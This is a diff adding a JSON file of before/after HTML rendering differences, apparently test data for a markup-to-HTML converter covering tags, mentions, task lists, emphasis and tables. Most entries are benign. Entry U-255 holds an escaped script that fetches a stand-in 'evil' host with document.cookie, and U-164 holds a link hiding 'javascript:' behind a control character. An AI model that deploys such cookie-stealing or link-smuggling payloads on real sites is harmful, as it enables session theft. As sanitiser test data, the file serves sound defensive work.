@@ -1,0 +1,896 @@
+[
+  {
+    "id": "U-072",
+    "before": [
+      "a*",
+      "<span class=\"critic-comment\">",
+      "b} c ",
+      "</span>"
+    ],
+    "after": [
+      "a*{#b} c #}"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-073",
+    "before": [
+      "see config",
+      "<span class=\"ext-items\">",
+      "0",
+      "</span>",
+      " and :smile: and x:smile:"
+    ],
+    "after": [
+      "see config:items[0] and :smile: and x:smile:"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-073",
+    "before": [
+      " and a#tag and é",
+      "<span class=\"tag\">",
+      "<strong>",
+      "#tag",
+      "</strong>",
+      "</span>",
+      " and "
+    ],
+    "after": [
+      " and a#tag and é#tag and "
+    ],
+    "left": "</span>",
+    "right": "<span class=\"tag\">"
+  },
+  {
+    "id": "U-073",
+    "before": [
+      "mail a@user and é",
+      "<span class=\"mention\">",
+      "<strong>",
+      "@user",
+      "</strong>",
+      "</span>",
+      " and "
+    ],
+    "after": [
+      "mail a@user and é@user and "
+    ],
+    "left": "<p>",
+    "right": "<span class=\"mention\">"
+  },
+  {
+    "id": "U-133",
+    "before": [
+      "<li>"
+    ],
+    "after": [
+      "<li class=\"task\" style=\"list-style: none\">"
+    ],
+    "left": "<ul class=\"task-list\">",
+    "right": "<input disabled type=\"checkbox\">"
+  },
+  {
+    "id": "U-133",
+    "before": [
+      "<li data-task-state=\"x\" id=\"k\">",
+      "<input aria-label=\"bare\" checked disabled type=\"checkbox\">"
+    ],
+    "after": [
+      "<li class=\"task\" data-task-state=\"x\" id=\"k\" style=\"list-style: none\">",
+      "<input aria-label=\"bare inside\" checked disabled type=\"checkbox\">"
+    ],
+    "left": "<ul class=\"task-list\">",
+    "right": " bare"
+  },
+  {
+    "id": "U-133",
+    "before": [
+      "<li data-task-state=\"x\" id=\"k\">",
+      "<input aria-label=\"old\" checked disabled type=\"checkbox\">"
+    ],
+    "after": [
+      "<li class=\"task\" data-task-state=\"x\" id=\"k\" style=\"list-style: none\">",
+      "<input aria-label=\"old outside\" checked disabled type=\"checkbox\">"
+    ],
+    "left": "<ul class=\"task-list\">",
+    "right": " old"
+  },
+  {
+    "id": "U-133",
+    "before": [
+      "<li data-task-state=\"x\" title=\"😀\">",
+      "<input aria-label=\"a\" checked disabled type=\"checkbox\">"
+    ],
+    "after": [
+      "<li class=\"task\" data-task-state=\"x\" style=\"list-style: none\" title=\"😀\">",
+      "<input aria-label=\"a h\" checked disabled type=\"checkbox\">"
+    ],
+    "left": "<ul class=\"task-list\">",
+    "right": " a"
+  },
+  {
+    "id": "U-140",
+    "before": [
+      "\t"
+    ],
+    "after": [],
+    "left": "<td>",
+    "right": "</td>"
+  },
+  {
+    "id": "U-143",
+    "before": [
+      "<em>",
+      "{",
+      "</em>"
+    ],
+    "after": [
+      "/{/"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-143",
+    "before": [
+      "<strong class=\"x\">",
+      "a *b"
+    ],
+    "after": [
+      "*a ",
+      "<strong class=\"x\">",
+      "b"
+    ],
+    "left": "<p>",
+    "right": "</strong>"
+  },
+  {
+    "id": "U-143",
+    "before": [
+      "//a/ and snake_/case/"
+    ],
+    "after": [
+      "//a/ and snake_",
+      "<em>",
+      "case",
+      "</em>"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-143",
+    "before": [
+      "*",
+      "<mark>",
+      "a*{k=b",
+      "</mark>"
+    ],
+    "after": [
+      "<strong k=\"b=\">",
+      "{=a",
+      "</strong>"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-143",
+    "before": [
+      "=",
+      "<em>",
+      "a={k=b",
+      "</em>"
+    ],
+    "after": [
+      "={/a={k=b/}"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-143",
+    "before": [
+      "a*",
+      "<u>",
+      "k=b",
+      "</u>"
+    ],
+    "after": [
+      "a*{_k=b_}"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-145",
+    "before": [
+      "<em>",
+      "*",
+      "</em>",
+      "/"
+    ],
+    "after": [
+      "/*//"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-148",
+    "before": [
+      "<section id=\"h\">",
+      "<h1>",
+      "\t%%h"
+    ],
+    "after": [
+      "<section id=\"s\">",
+      "<h1>"
+    ],
+    "left": null,
+    "right": "</h1>"
+  },
+  {
+    "id": "U-151",
+    "before": [
+      "<u>",
+      "{",
+      "</u>"
+    ],
+    "after": [
+      "{_{_}"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-152",
+    "before": [
+      "<td>",
+      "</td>",
+      "<td>",
+      "\t&lt;"
+    ],
+    "after": [
+      "<td colspan=\"2\">"
+    ],
+    "left": "<tr>",
+    "right": "</td>"
+  },
+  {
+    "id": "U-153",
+    "before": [
+      "\te"
+    ],
+    "after": [
+      "e"
+    ],
+    "left": "<li>",
+    "right": "</li>"
+  },
+  {
+    "id": "U-155",
+    "before": [
+      "a\t%%"
+    ],
+    "after": [
+      "a"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-157",
+    "before": [
+      "<pre>"
+    ],
+    "after": [
+      "<pre title=\"\">"
+    ],
+    "left": null,
+    "right": "<code class=\"language-s\">"
+  },
+  {
+    "id": "U-158",
+    "before": [
+      "[\\[][]"
+    ],
+    "after": [
+      "[[][]"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-158",
+    "before": [
+      "[a][a]{.c}{#i}"
+    ],
+    "after": [
+      "[a][a]{#i .c}"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-158",
+    "before": [
+      "[a][b]{.c}{.d}"
+    ],
+    "after": [
+      "[a][b]{.c .d}"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-158",
+    "before": [
+      "x[a][a]{key=v}{#i}"
+    ],
+    "after": [
+      "x[a][a]{#i key=v}"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-158",
+    "before": [
+      "[a][]{#i}{.c}"
+    ],
+    "after": [
+      "[a][]{#i .c}"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-158",
+    "before": [
+      "[\\*][]"
+    ],
+    "after": [
+      "[*][]"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-159",
+    "before": [
+      "<li data-task-state=\"x\">",
+      "<input aria-label=\"a h\" checked disabled type=\"checkbox\">"
+    ],
+    "after": [
+      "<li class=\"task\" data-task-state=\"x\" style=\"list-style: none\">",
+      "<input aria-label=\"a  h\" checked disabled type=\"checkbox\">"
+    ],
+    "left": "<ul class=\"task-list\">",
+    "right": " a  h"
+  },
+  {
+    "id": "U-161",
+    "before": [
+      "![][a\nb]"
+    ],
+    "after": [
+      "![][a b]"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-162",
+    "before": [
+      "<td style=\"vertical-align: bottom;\">"
+    ],
+    "after": [
+      "<td>",
+      "?v"
+    ],
+    "left": "<tr>",
+    "right": "</td>"
+  },
+  {
+    "id": "U-163",
+    "before": [
+      "<ul class=\"task-list\">",
+      "<li>",
+      "<input aria-label=\"q\" disabled type=\"checkbox\">",
+      " q"
+    ],
+    "after": [
+      "<ul>",
+      "<li>",
+      "[ ] q"
+    ],
+    "left": null,
+    "right": "</li>"
+  },
+  {
+    "id": "U-164",
+    "before": [
+      "<a href=\"‮javascript:\">"
+    ],
+    "after": [
+      "<a href=\"\">"
+    ],
+    "left": "<p>",
+    "right": "</a>"
+  },
+  {
+    "id": "U-165",
+    "before": [
+      "<td>",
+      "{",
+      "<span class=\"tag\">",
+      "<strong>",
+      "#x",
+      "</strong>",
+      "</span>",
+      "}"
+    ],
+    "after": [
+      "<td id=\"x\">"
+    ],
+    "left": "<tr>",
+    "right": "</td>"
+  },
+  {
+    "id": "U-165",
+    "before": [
+      "<td>",
+      "{.total}99"
+    ],
+    "after": [
+      "<td class=\"total\">",
+      "99"
+    ],
+    "left": "<tr>",
+    "right": "</td>"
+  },
+  {
+    "id": "U-165",
+    "before": [
+      "<td>"
+    ],
+    "after": [
+      "<td rowspan=\"2\">"
+    ],
+    "left": "<tr>",
+    "right": "a"
+  },
+  {
+    "id": "U-166",
+    "before": [
+      "[][@a]"
+    ],
+    "after": [
+      "[][",
+      "<span class=\"mention\">",
+      "<strong>",
+      "@a",
+      "</strong>",
+      "</span>",
+      "]"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-167",
+    "before": [
+      "<th scope=\"col\" style=\"text-align: left;\">",
+      "="
+    ],
+    "after": [
+      "<th scope=\"col\">"
+    ],
+    "left": "<tr>",
+    "right": "</th>"
+  },
+  {
+    "id": "U-168",
+    "before": [
+      "<td>",
+      "=",
+      "</td>"
+    ],
+    "after": [
+      "<th scope=\"row\">",
+      "</th>"
+    ],
+    "left": "<tr>",
+    "right": "<td>"
+  },
+  {
+    "id": "U-170",
+    "before": [
+      "@a-",
+      "</strong>",
+      "</span>"
+    ],
+    "after": [
+      "@a",
+      "</strong>",
+      "</span>",
+      "-"
+    ],
+    "left": "<strong>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-171",
+    "before": [
+      "<img alt=\"\n\" src=\"\">"
+    ],
+    "after": [
+      "<p>",
+      "<img alt=\"\n\" src=\"\">",
+      "</p>"
+    ],
+    "left": null,
+    "right": null
+  },
+  {
+    "id": "U-172",
+    "before": [
+      "<dl>"
+    ],
+    "after": [
+      "<dl loose=\"\">"
+    ],
+    "left": null,
+    "right": "<dt>"
+  },
+  {
+    "id": "U-174",
+    "before": [
+      "\tx"
+    ],
+    "after": [
+      "x"
+    ],
+    "left": "<h1>",
+    "right": "</h1>"
+  },
+  {
+    "id": "U-175",
+    "before": [
+      "<a href=\"\">",
+      "</a>"
+    ],
+    "after": [
+      "[]( )"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-176",
+    "before": [
+      "<section id=\"T\">",
+      "<h1>",
+      "T",
+      "</h1>",
+      "<p>",
+      "b",
+      "</p>"
+    ],
+    "after": [
+      "<section id=\"T-b\">",
+      "<h1>",
+      "T\rb",
+      "</h1>"
+    ],
+    "left": null,
+    "right": "</section>"
+  },
+  {
+    "id": "U-193",
+    "before": [
+      "\tx"
+    ],
+    "after": [
+      "x"
+    ],
+    "left": "<dt>",
+    "right": "</dt>"
+  },
+  {
+    "id": "U-194",
+    "before": [
+      "\t—"
+    ],
+    "after": [
+      "—"
+    ],
+    "left": "<td>",
+    "right": "</td>"
+  },
+  {
+    "id": "U-198",
+    "before": [
+      "<del>",
+      "a",
+      "</del>",
+      "<ins>",
+      "</ins>"
+    ],
+    "after": [
+      "<s>",
+      "a~&gt;",
+      "</s>"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-198",
+    "before": [
+      "<del>",
+      "</del>",
+      "<ins>",
+      "b",
+      "</ins>"
+    ],
+    "after": [
+      "<s>",
+      "~&gt;b",
+      "</s>"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-198",
+    "before": [
+      "<del>",
+      "</del>",
+      "<ins>",
+      "</ins>"
+    ],
+    "after": [
+      "<s>",
+      "~&gt;",
+      "</s>"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-201",
+    "before": [
+      "<u>",
+      "a",
+      "</u>",
+      " y"
+    ],
+    "after": [
+      "{_a"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-201",
+    "before": [
+      "<u>",
+      "a-}",
+      "</u>",
+      " b",
+      "</del>"
+    ],
+    "after": [
+      "{_a",
+      "</del>",
+      "_} b-}"
+    ],
+    "left": "<del>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-201",
+    "before": [
+      "{+b~}",
+      "</ins>",
+      "+}"
+    ],
+    "after": [
+      "<ins>",
+      "b~}",
+      "</ins>",
+      "</ins>"
+    ],
+    "left": "<ins>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-201",
+    "before": [
+      "<mark>",
+      "a&nbsp;",
+      "</mark>",
+      " t and b &nbsp;"
+    ],
+    "after": [
+      "{=a&nbsp;"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-206",
+    "before": [
+      "<strong>",
+      "Setup",
+      "</strong>"
+    ],
+    "after": [
+      "Setup"
+    ],
+    "left": "<a href=\"#Setup\">",
+    "right": "</a>"
+  },
+  {
+    "id": "U-206",
+    "before": [
+      "A A "
+    ],
+    "after": [
+      "A "
+    ],
+    "left": "<a href=\"#A\">",
+    "right": "</a>"
+  },
+  {
+    "id": "U-206",
+    "before": [
+      "<span class=\"tag\">",
+      "<strong>",
+      "#y",
+      "</strong>",
+      "</span>",
+      " 1"
+    ],
+    "after": [
+      "#y 1"
+    ],
+    "left": "<a href=\"#t\">",
+    "right": "</a>"
+  },
+  {
+    "id": "U-240",
+    "before": [
+      " [b]{:abcdefghi}"
+    ],
+    "after": [
+      " ",
+      "<span lang=\"abcdefghi\">",
+      "b",
+      "</span>"
+    ],
+    "left": "</span>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-241",
+    "before": [
+      "[a\nb][missing]"
+    ],
+    "after": [
+      "[a",
+      "<br>",
+      "b][missing]"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-248",
+    "before": [
+      "c\u000bd"
+    ],
+    "after": [
+      "c�d"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-248",
+    "before": [
+      "a\n\nb"
+    ],
+    "after": [
+      "a\n�\nb"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-248",
+    "before": [
+      "ab",
+      "</h1>",
+      "</section>",
+      "<section id=\"a-b-2\">",
+      "<h1>",
+      "a!?b"
+    ],
+    "after": [
+      "a�b",
+      "</h1>",
+      "</section>",
+      "<section id=\"a-b-2\">",
+      "<h1>",
+      "a!�?b"
+    ],
+    "left": "<h1>",
+    "right": "</h1>"
+  },
+  {
+    "id": "U-249",
+    "before": [
+      "<span CLASS=\"math inline c\" role=\"math\">"
+    ],
+    "after": [
+      "<span class=\"math inline c\" role=\"math\">"
+    ],
+    "left": "<p>",
+    "right": "\\(a\\)"
+  },
+  {
+    "id": "U-254",
+    "before": [
+      "/",
+      "<ins>",
+      "a/{k=b",
+      "</ins>"
+    ],
+    "after": [
+      "<em k=\"b+\">",
+      "{+a",
+      "</em>"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-254",
+    "before": [
+      "<em class=\"c\">",
+      "x /",
+      "<strong>",
+      "a",
+      "</strong>",
+      "</em>",
+      " y"
+    ],
+    "after": [
+      "/x /*a"
+    ],
+    "left": "<p>",
+    "right": "</p>"
+  },
+  {
+    "id": "U-255",
+    "before": [
+      "iframe&gt;\n&lt;script&gt;fetch(“",
+      "</em>",
+      "/evil/?” + document.cookie)&lt;/script&gt;"
+    ],
+    "after": [
+      "iframe&gt;\n&lt;script&gt;fetch(“//evil",
+      "</em>",
+      "?” + document.cookie)&lt;/script&gt;"
+    ],
+    "left": "<em>",
+    "right": "</p>"
+  }
+]
